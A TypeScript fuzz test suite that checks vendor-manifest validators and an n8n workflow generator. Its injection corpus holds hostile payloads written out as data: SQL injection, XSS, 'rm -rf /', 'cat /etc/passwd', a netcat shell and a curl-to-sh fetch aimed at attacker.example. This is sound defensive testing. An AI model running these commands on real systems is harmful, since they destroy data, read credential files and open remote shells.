import { test } from "node:test";
import assert from "node:assert/strict";
import { check, gen, type Rng } from "./proptest";

import { validate, typeMatches, jsTypeOf, type JsonSchema } from "./vendor-schema";
import { VENDOR_SCHEMAS } from "./vendor-schemas.generated";
import { generateWorkflow, titleFor } from "./workflow-generator";
import type { BackendDefinition } from "./backend-catalogue";
import type { ContractAction } from "./backend-manifest";
import { verifyPlaneEntry } from "./plane-verifier";
import { dedupeEntities, matchCandidates, normaliseKey } from "./entity-resolution";
import { validateVendor, registerVendor, clearVendorOverlay, withOverlay, vendorOverlayCounts, type VendorPlane } from "./vendor-overlay";

/**
 * INJECTION FUZZ suite for the backend-catalogue SCHEMA VALIDATORS + GENERATORS.
 *
 * These modules consume UNTRUSTED vendor manifests (a deployment's own config-dir
 * JSON is validated/overlaid at boot, and per-action string fields end up embedded in
 * a generated n8n workflow). So the safety invariant every one of them rests on is:
 * hostile input is inert DATA — it never crashes the validator/generator, never
 * pollutes a prototype, and never gets executed/evaluated as code.
 *
 * Runs on this package's deterministic `proptest` harness (seeded; a failure prints
 * PROPTEST_SEED=<n> to replay the exact offending input). Set PROPTEST_SEED /
 * PROPTEST_RUNS to explore more of the space.
 */

// ── The injection corpus (mirrors artifacts/api-server fuzz-injection.test.ts) ────
const INJECTION: readonly string[] = [
  // SQL
  "' OR '1'='1", "'; DROP TABLE users;--", "1 UNION SELECT password FROM users",
  "' OR 1=1--", "admin'--", "\"; DELETE FROM projects WHERE ''='", "1; UPDATE settings SET x=1--",
  // JavaScript / XSS / template-expression injection
  "<script>alert(1)</script>", "javascript:alert(document.cookie)", "${process.env.SESSION_SECRET}",
  "{{constructor.constructor('return process')()}}", "`${7*7}`", "');alert(1);//",
  "constructor.constructor('return this')()", "eval('1+1')", "require('child_process').exec('id')",
  "\"><img src=x onerror=alert(1)>", "{{7*7}}", "#{7*7}", "%{7*7}",
  // Shell command injection
  "$(rm -rf /)", "; ls -la /", "&& cat /etc/passwd", "| nc attacker.example 4444", "`whoami`",
  "$(curl attacker.example|sh)", "\n/bin/sh",
  // Prototype pollution
  "__proto__", "constructor", "prototype", "__proto__.polluted",
  // Path traversal / null / header smuggling
  "../../../etc/passwd", "..\\..\\..\\windows\\system32\\cmd.exe", " ", "/ok\r\nSet-Cookie: x=1",
  "file:///etc/passwd", "‮",
  // n8n-expression injection aimed at the generator/resolver
  "={{ $env.SESSION_SECRET }}", "$json.body.payload.__proto__.x", "$env.PATH",
];

const NASTY_ALPHABET = "ab12'\"`{}$();<>\\/-. \n\t=&|:@#%";
const DANGER_KEYS = ["__proto__", "constructor", "prototype"] as const;

/** A generated hostile string: a corpus payload, a random nasty string, or the two spliced. */
function evil(r: Rng): string {
  const roll = gen.int(r, 0, 2);
  const rand = gen.string(r, NASTY_ALPHABET, 48);
  if (roll === 0) return gen.pick(r, INJECTION);
  if (roll === 1) return rand;
  return gen.pick(r, INJECTION) + rand;
}

/** A hostile scalar: injection string, weird number, boolean, null/undefined. */
function evilScalar(r: Rng): unknown {
  return gen.oneOf<unknown>(
    r,
    (r) => evil(r),
    (r) => gen.int(r, -1_000_000, 1_000_000),
    (r) => gen.pick(r, [NaN, Infinity, -Infinity, 0, -0, 1e308, -1e308]),
    (r) => gen.bool(r),
    () => null,
    () => undefined,
  );
}

/**
 * A hostile object with a mix of benign keys AND real OWN prototype-pollution keys.
 * `Object.defineProperty` is used deliberately: a computed/bracket assignment of
 * "__proto__" would hit the setter (mutating the object's prototype) instead of
 * creating an own key — we want the classic own-"__proto__" vector that a naive
 * recursive merge/assign would splash onto Object.prototype.
 */
function evilObject(r: Rng, depth: number): Record<string, unknown> {
  const o: Record<string, unknown> = {};
  const n = gen.int(r, 0, 4);
  for (let i = 0; i < n; i++) {
    const danger = gen.bool(r);
    const key = danger ? gen.pick(r, DANGER_KEYS) : gen.oneOf(r, (r) => evil(r), (r) => gen.string(r, "abcdefghij", 6));
    // Under a danger key, sometimes plant the canonical pollution payload so the
    // no-pollution sentinel (which probes `.polluted`/`.x`) is genuinely exercised.
    const val = danger && gen.bool(r) ? { polluted: true, x: 1 } : evilValue(r, depth - 1);
    Object.defineProperty(o, key, { value: val, enumerable: true, writable: true, configurable: true });
  }
  return o;
}

/** An arbitrary hostile JSON-ish value (bounded depth): scalar, object, or array. */
function evilValue(r: Rng, depth = 3): unknown {
  if (depth <= 0) return evilScalar(r);
  return gen.oneOf<unknown>(
    r,
    evilScalar,
    (r) => evilObject(r, depth),
    (r) => gen.array(r, (r) => evilValue(r, depth - 1), 4),
  );
}

/** Prototype-pollution sentinels: nothing below should ever become defined. */
function assertNoPollution(): void {
  const probe = {} as Record<string, unknown>;
  assert.equal(probe["polluted"], undefined, "Object.prototype was polluted (.polluted)");
  assert.equal(probe["x"], undefined, "Object.prototype was polluted (.x)");
  assert.equal((Object.prototype as Record<string, unknown>)["polluted"], undefined);
  assert.equal(([] as unknown as Record<string, unknown>)["polluted"], undefined);
}

/** Assert a value is JSON-serialisable and contains no function/symbol anywhere. */
function assertInertJson(v: unknown): void {
  assert.equal(typeof JSON.stringify(v), "string", "output must be JSON-serialisable");
  const walk = (x: unknown, seen: Set<object>): void => {
    if (x === null) return;
    const t = typeof x;
    assert.notEqual(t, "function", "a function leaked into generated output");
    assert.notEqual(t, "symbol", "a symbol leaked into generated output");
    if (t === "object") {
      if (seen.has(x as object)) return;
      seen.add(x as object);
      for (const val of Object.values(x as Record<string, unknown>)) walk(val, seen);
    }
  };
  walk(v, new Set());
}

// ══ 1. vendor-schema.validate — untrusted VALUES against REAL vendor schemas ═══════
const SCHEMA_PLANES = Object.keys(VENDOR_SCHEMAS);

test("fuzz: validate() never throws + always returns string[] for hostile VALUES vs real vendor schemas", () => {
  check(
    (r) => ({ plane: gen.pick(r, SCHEMA_PLANES), value: evilValue(r) }),
    ({ plane, value }) => {
      let errs: unknown;
      assert.doesNotThrow(() => { errs = validate(VENDOR_SCHEMAS[plane]!, value); });
      assert.ok(Array.isArray(errs), "validate must return an array");
      assert.ok((errs as unknown[]).every((e) => typeof e === "string"), "every error is a string");
      assertNoPollution();
    },
    { runs: 500 },
  );
});

test("fuzz: validate() treats injection payloads as INERT DATA for string fields (accepts, never executes)", () => {
  // A string field that matches the schema accepts ANY string verbatim — the payload is
  // stored as data for the user, never evaluated. (Non-vacuous: asserts errs === [].)
  const schema: JsonSchema = { type: "object", properties: { note: { type: "string" } }, required: ["note"] };
  for (const p of INJECTION) {
    assert.deepEqual(validate(schema, { note: p }), [], `injection payload was not accepted as inert data: ${p}`);
  }
  assertNoPollution();
});

test("fuzz: validate() is CONTROLLED on hostile SCHEMAS — returns string[] or a synchronous Error, never pollutes", () => {
  // The documented model is trusted-schema / untrusted-value; a garbage schema is out of
  // contract. We assert it degrades safely: it either returns a string[] or throws a plain
  // Error synchronously (no hang, no pollution). See report — validate is NOT hardened
  // against adversarial schemas (invalid `pattern` regex, non-array `enum`/`required`,
  // non-object schema all throw). This test pins that the failure stays controlled.
  check(
    (r) => ({ schema: evilValue(r), value: evilValue(r) }),
    ({ schema, value }) => {
      try {
        const errs = validate(schema as unknown as JsonSchema, value);
        assert.ok(Array.isArray(errs) && errs.every((e) => typeof e === "string"));
      } catch (e) {
        assert.ok(e instanceof Error, "a hostile schema must fail as a controlled Error, not a crash");
      }
      assertNoPollution();
    },
    { runs: 500 },
  );
});

test("fixed: additionalProperties:false and required use Object.hasOwn, so prototype key names can't bypass them", () => {
  // `validate` now uses Object.hasOwn for both the property-known check and required, so a value
  // key named "constructor"/"toString"/… no longer resolves to an inherited Object.prototype member
  // and slip past a strict schema; and `required:["constructor"]` is no longer satisfied by {}.
  const strict: JsonSchema = { type: "object", required: ["id"], properties: { id: { type: "string" } }, additionalProperties: false };
  assert.ok(validate(strict, { id: "x", bogus: true }).some((e) => e.includes("unexpected property")), "a normal extra prop IS flagged");
  // Prototype-named extras are now flagged unexpected, just like any other unknown property.
  assert.ok(validate(strict, { id: "x", constructor: 1 }).some((e) => e.includes("unexpected property")), "constructor must be flagged");
  assert.ok(validate(strict, { id: "x", toString: 1 }).some((e) => e.includes("unexpected property")), "toString must be flagged");
  // `required` is no longer satisfied by an inherited member on an empty object.
  assert.ok(validate({ type: "object", required: ["constructor"], properties: {} }, {}).some((e) => e.includes("missing required")), "inherited member must NOT satisfy required");
  assertNoPollution();
});

test("fuzz: typeMatches / jsTypeOf never throw and return the right primitive kind", () => {
  const TYPES = ["object", "array", "string", "number", "integer", "boolean", "weird", ""];
  check(
    (r) => ({ type: gen.pick(r, TYPES), value: evilValue(r) }),
    ({ type, value }) => {
      let m: unknown; let label: unknown;
      assert.doesNotThrow(() => { m = typeMatches(type, value); });
      assert.doesNotThrow(() => { label = jsTypeOf(value); });
      assert.equal(typeof m, "boolean");
      assert.equal(typeof label, "string");
      assertNoPollution();
    },
    { runs: 300 },
  );
});

// ══ 2. workflow-generator — hostile string fields become inert embedded text ═══════
const CONTRACT_ACTIONS: ContractAction[] = ["list_projects", "list_issues", "create_issue", "update_issue", "delete_issue"];

function evilMapping(r: Rng): Record<string, unknown> {
  if (gen.bool(r)) {
    // n8nNode transport — `node` must be a non-empty string (an empty node is a structural
    // error the generator throws on by design; we test injection CONTENT, not bad structure).
    return { kind: "n8nNode", node: evil(r) || "n8n-nodes-base.noop", typeVersion: gen.int(r, 1, 3), parameters: evilObject(r, 2), note: evil(r) };
  }
  return {
    kind: "http",
    method: gen.pick(r, ["GET", "POST", "PATCH", "PUT", "DELETE"]),
    url: evil(r),
    body: gen.bool(r) ? evil(r) : undefined,
    credentialType: gen.bool(r) ? evil(r) : undefined,
    note: evil(r),
  };
}

function evilManifest(r: Rng): BackendDefinition {
  const actions: Record<string, unknown> = {};
  for (const a of CONTRACT_ACTIONS) if (gen.bool(r)) actions[a] = evilMapping(r);
  const caps: Record<string, boolean> = {};
  for (let i = 0; i < gen.int(r, 0, 4); i++) caps[gen.string(r, "abcdef", 6) || "cap"] = gen.bool(r);
  return {
    id: (evil(r) || "x"),
    label: evil(r),
    docsUrl: evil(r),
    verification: gen.pick(r, ["verified", "catalogued", "experimental"]),
    via: evil(r),
    requiredEnv: gen.array(r, (r) => evil(r), 4),
    capabilities: caps,
    authHeader: evil(r),
    credentialType: gen.bool(r) ? evil(r) : undefined,
    kind: gen.pick(r, ["live", "import", "database", undefined]),
    notes: evil(r),
    actions,
  } as unknown as BackendDefinition;
}

test("fuzz: generateWorkflow() never throws, emits inert JSON, and carries payloads through as inert TEXT", () => {
  check(
    (r) => {
      const opts: { webhookPath?: string; readOnly?: boolean } = { readOnly: gen.bool(r) };
      if (gen.bool(r)) opts.webhookPath = evil(r);
      return { manifest: evilManifest(r), opts };
    },
    ({ manifest, opts }) => {
      let wf: ReturnType<typeof generateWorkflow> | undefined;
      assert.doesNotThrow(() => { wf = generateWorkflow(manifest, opts); });
      const w = wf!;
      // Shape: a plain, JSON-serialisable object with no executable value smuggled in.
      assert.equal(typeof w.name, "string");
      assert.ok(Array.isArray(w.nodes));
      assert.equal(typeof w.connections, "object");
      assertInertJson(w);
      // The hostile label is embedded verbatim as inert text in a string field (not executed,
      // not stripped) — proving the payload survives as DATA only.
      assert.ok(w.name.includes(manifest.label), "manifest.label must pass through as inert text");
      assertNoPollution();
    },
    { runs: 400 },
  );
});

test("fuzz: titleFor() never throws and returns a plain string for arbitrary/injection actions", () => {
  check(
    (r) => evil(r),
    (s) => {
      let t: unknown;
      assert.doesNotThrow(() => { t = titleFor(s as ContractAction); });
      assert.equal(typeof t, "string");
      assertNoPollution();
    },
    { runs: 300 },
  );
});

// ══ 3. plane-verifier — arbitrary/garbage/injection entries for every plane ════════
const PLANE_IDS = ["backends", "brokers", "outputs", "notifications", "methodologies", "reports", "screens"];

test("fuzz: verifyPlaneEntry() never throws and always returns {ok, plane, errors[], warnings[]}", () => {
  check(
    (r) => ({ plane: gen.oneOf(r, (r) => gen.pick(r, PLANE_IDS), (r) => evil(r)), entry: evilValue(r) }),
    ({ plane, entry }) => {
      let res: ReturnType<typeof verifyPlaneEntry> | undefined;
      assert.doesNotThrow(() => { res = verifyPlaneEntry(plane, entry); });
      const r = res!;
      assert.equal(typeof r.ok, "boolean");
      assert.equal(typeof r.plane, "string");
      assert.ok(Array.isArray(r.errors) && r.errors.every((e) => typeof e === "string"), "errors is string[]");
      assert.ok(Array.isArray(r.warnings) && r.warnings.every((e) => typeof e === "string"), "warnings is string[]");
      assertNoPollution();
    },
    { runs: 500 },
  );
});

test("fuzz: every plane's checks handle a hostile object entry (each CHECKS branch, no throw)", () => {
  const hostile = evilLoadedEntry();
  for (const p of PLANE_IDS) {
    const res = verifyPlaneEntry(p, hostile);
    assert.equal(res.plane, p);
    assert.equal(typeof res.ok, "boolean");
    assert.ok(Array.isArray(res.errors));
  }
  assertNoPollution();
});

/** A single object entry that carries injection into every field every plane's check reads. */
function evilLoadedEntry(): Record<string, unknown> {
  const e: Record<string, unknown> = {
    id: "'; DROP TABLE x;--", label: "<script>alert(1)</script>",
    verification: "constructor.constructor('return this')()", via: "${SECRET}",
    requiredEnv: "not-an-array", capabilities: { synchronous: "yes", readOnly: 1, delivery: 42, requiresRole: "root", requiresCapability: {} },
    kind: "javascript:alert(1)", authHeader: 0, credentialType: null,
    actions: "not-an-object", transports: 5, build: {}, route: [], tools: "nope",
    alsoProvides: [{ plane: "__proto__" }, "junk", null],
  };
  Object.defineProperty(e, "__proto__", { value: { polluted: true, x: 1 }, enumerable: true, writable: true, configurable: true });
  return e;
}

// ══ 4. entity-resolution — untrusted records/keys, pure merges ═════════════════════
type Rec = Record<string, unknown>;

test("fuzz: dedupeEntities() never throws, preserves record count, and never pollutes on merge", () => {
  const keyFns: Array<(r: Rec) => string | null | undefined> = [
    () => null,
    () => undefined,
    (rec) => normaliseKey(rec && rec["id"]),
    (rec) => (rec && typeof rec === "object" ? (Object.keys(rec)[0] ?? null) : null),
  ];
  check(
    (r) => ({ records: gen.array(r, (r) => evilObject(r, 2), 6), keyIdx: gen.int(r, 0, keyFns.length - 1) }),
    ({ records, keyIdx }) => {
      let out: ReturnType<typeof dedupeEntities<Rec>> | undefined;
      assert.doesNotThrow(() => { out = dedupeEntities(records, keyFns[keyIdx]!); });
      const groups = out!;
      assert.ok(Array.isArray(groups));
      let total = 0;
      for (const g of groups) {
        assert.equal(typeof g.key, "string");
        assert.ok(Array.isArray(g.records));
        assert.equal(g.count, g.records.length);
        total += g.count;
      }
      assert.equal(total, records.length, "every record is accounted for (synthetic key for keyless)");
      assertNoPollution();
    },
    { runs: 400 },
  );
});

test("fuzz: matchCandidates() never throws and only surfaces groups of >=2", () => {
  const matchers = [
    { name: "email", fn: (rec: Rec) => normaliseKey(rec && rec["email"]) },
    { name: "id", fn: (rec: Rec) => (rec && typeof rec["id"] === "string" ? (rec["id"] as string) : null) },
  ];
  check(
    (r) => gen.array(r, (r) => evilObject(r, 2), 8),
    (records) => {
      let cands: ReturnType<typeof matchCandidates<Rec>> | undefined;
      assert.doesNotThrow(() => { cands = matchCandidates(records, matchers); });
      for (const c of cands!) {
        assert.equal(typeof c.matchedOn, "string");
        assert.equal(typeof c.key, "string");
        assert.ok(Array.isArray(c.records) && c.records.length >= 2, "candidates only for >=2 records");
      }
      assertNoPollution();
    },
    { runs: 400 },
  );
});

test("fuzz: normaliseKey() never throws and returns string | null for any hostile value", () => {
  check(
    (r) => (gen.bool(r) ? evil(r) : evilValue(r)),
    (v) => {
      let k: unknown;
      assert.doesNotThrow(() => { k = normaliseKey(v); });
      assert.ok(k === null || typeof k === "string", "normaliseKey returns string | null");
      assertNoPollution();
    },
    { runs: 400 },
  );
});

// ══ 5. vendor-overlay — untrusted deployment vendors validated/registered ══════════
const VENDOR_PLANES: VendorPlane[] = ["backends", "brokers", "notifications", "outputs"];

test("fuzz: validateVendor() never throws + returns string[] for hostile data on any plane string", () => {
  check(
    (r) => ({ plane: gen.oneOf(r, (r) => gen.pick(r, VENDOR_PLANES), (r) => evil(r)), data: evilValue(r) }),
    ({ plane, data }) => {
      let errs: unknown;
      assert.doesNotThrow(() => { errs = validateVendor(plane as VendorPlane, data); });
      assert.ok(Array.isArray(errs) && (errs as unknown[]).every((e) => typeof e === "string"), "returns string[]");
      assertNoPollution();
    },
    { runs: 500 },
  );
});

test("fuzz: registerVendor() rejects invalid vendors (throws), never registers garbage, no pollution", () => {
  check(
    (r) => ({ plane: gen.pick(r, VENDOR_PLANES), data: evilObject(r, 2) }),
    ({ plane, data }) => {
      const before = vendorOverlayCounts()[plane];
      let threw = false;
      try {
        registerVendor(plane, data as { id: string });
      } catch (e) {
        threw = true;
        assert.ok(e instanceof Error, "registration failure must be a controlled Error");
      }
      const after = vendorOverlayCounts()[plane];
      // Either it threw (garbage rejected) or it registered a schema-valid vendor — never a
      // silent corruption. Reset so runs stay independent + the package's global stays clean.
      assert.ok(threw ? after === before : after === before + 1, "no garbage silently accepted");
      clearVendorOverlay();
      assertNoPollution();
    },
    { runs: 200 },
  );
});

test("withOverlay returns base unchanged when nothing is registered (clean global after fuzz)", () => {
  clearVendorOverlay();
  const base = [{ id: "a" }, { id: "b" }];
  assert.equal(withOverlay("backends", base), base, "no overlay ⇒ identity (zero overhead)");
  assert.deepEqual(vendorOverlayCounts(), { backends: 0, brokers: 0, notifications: 0, outputs: 0 });
});
